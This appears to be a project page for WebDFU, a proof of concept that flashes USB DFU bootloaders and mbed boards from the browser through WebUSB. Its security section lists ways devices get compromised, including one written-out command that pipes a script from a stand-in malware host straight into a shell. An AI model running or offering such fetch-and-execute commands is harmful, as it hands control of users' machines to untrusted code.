---
title: WebDFU
subtitle: Device firmware updates in the browser using WebUSB
excerpt: >
  A demo investigating the potential non-malicious uses for allowing websites to
  reprogram USB-attached devices without installing any native plugins.
---
## Overview
WebDFU is a proof-of-concept using [WebUSB](https://wicg.github.io/webusb/) to reprogram [USB DFU](http://wiki.openmoko.org/wiki/USB_DFU_-_The_USB_Device_Firmware_Upgrade_standard) class devices from the browser. It supports USB DFU 1.1 and [DfuSe 1.1a](http://www.st.com/en/development-tools/stsw-stm32080.html) bootloaders and mbed boards with [custom interface firmware](https://github.com/devanlai/DAPLink).
It does not require the user to install browser plugins or proxy agents that could execute arbitrary code.

Note: WebUSB is currently a draft standard that is only implemented by Google Chrome.

## Potential for abuse
Putting the words "web" and "firmware" in the same sentence is likely to provoke a negative gut reaction from security-minded folks, so before we go any further, let's address this.

Any device with an unsecured bootloader that allows unrestricted access to it can be compromised if a malicious party gets access to it even once.
Depending on the nature of the bootloader and the malware, it may be irreversible and even undetectable.
This risk is not unique to firmware updates delivered from the browser.
Here's a non-comprehensive list of ways you can inadvertently compromise a USB device without involving WebUSB:
  
  * Leaving your device unattended in a public place, where anyone could pick it up, reflash it, and replace it.
  * Downloading and manually installing a malicious firmware update from a compromised website without first verifying the checksum.
  * Running `curl https://get.malware.example/ | sh` and subsequently plugging your device in.

We should strive to phase out devices that are vulnerable to these kinds of attacks, but in the meantime, there are millions of existing devices out in the wild that WebUSB opens up access to use for benevolent purposes.

## Applications

### Standalone firmware updates in the browser
The simplest application for WebUSB and firmware updates is to implement [dfu-util](http://dfu-util.sourceforge.net/) in a cross-platform browser application. dfu-util uses libusb to directly schedule the USB control transfers needed to execute a USB DFU firmware update. Since WebUSB offers a similar degree of low-level transfer-oriented API access, it's a straightforward exercise to port the necessary parts of dfu-util from C to javascript.

This could be used to build a rich firmware updater that can intelligently display release notes and update the device without installing any native software.

A live demo of a dfu-util-like site can be viewed online [here](https://devanlai.github.io/webdfu/dfu-util/).

The demo has been successfully tested on Linux with USB DFU 1.1 and USB DfuSe 1.1a devices. It should work on macOS and Windows as well, but WebUSB support is still evolving, so there may be issues.

### Online IDEs with hardware access
Sites such as [mbed.org](https://developer.mbed.org), [codebender](https://codebender.cc), and [Arduino Create](https://create.arduino.cc/) show that there are real use cases for online IDEs for firmware.

However, there is a critical gap in-between writing code in the browser and flashing that code onto a development board.
In the case of mbed, the user has to manually drag and drop the compiled firmware onto an emulated USB drive that then reprograms the board. For codebender and Arduino Create, the user must install special browser plugins or native software to allow the website to access the board.

With WebUSB, it's possible for the IDE to directly talk to the development board, creating a first class, seamless experience comparable to a native IDE, while retaining the benefits of automatic updates, cloud storage, and social code sharing.

Alas, as the mbed IDE is still closed source, we'll have to settle for something with a few more seams than we'd like.

One of the defining characteristics of mbed development boards is that they have an additional interface microcontroller that handles reprogramming the actual target chip from USB. It would be great if we could use WebUSB to talk to that interface microcontroller and tell it to reprogram the target.

Unfortunately, the programming is handled by repurposing USB mass storage and USB HID, both of which already have standard operating system drivers that WebUSB won't try to mess with. 

Fortunately for us, the firmware for most of those interface chips _is_ open-source as part of the [DAPLink](https://developer.mbed.org/handbook/DAPLink) project, so we can add a custom USB interface just for WebUSB. In this particular case, it was easiest for me to add [another USB DFU interface](https://github.com/devanlai/DAPLink), so the existing WebUSB DFU work above also works here.

So we've got a website that can talk to USB DFU devices and interface firmware that can reprogram the target chip using USB DFU, what else do we need? I'd love to add a free, cloud-hosted IDE, but I don't have the time or money to build one of those. Luckily, while the mbed IDE isn't open-source, you can leverage their online compiler through their [remote compilation API](https://developer.mbed.org/handbook/Compile-API) to build projects online.

The very rough live demo for all of this can be accessed [here](https://devanlai.github.io/webdfu/mbed-download/).

## Sources on GitHub

* WebUSB demo code: [webdfu](https://github.com/devanlai/webdfu)
* DAPLink with DFU and WebUSB: [daplink](https://github.com/devanlai/DAPLink)

## Future work

While it was expedient to add USB DFU to the DAPLink, there's no reason why we couldn't add another USB interface that provides full access to the debugging capabilities already present in the DAPLink firmware.

I'd like to extend it so that it's possible to set breakpoints and inspect peripheral registers on my development boards, all from an in-browser IDE that requires zero-installation.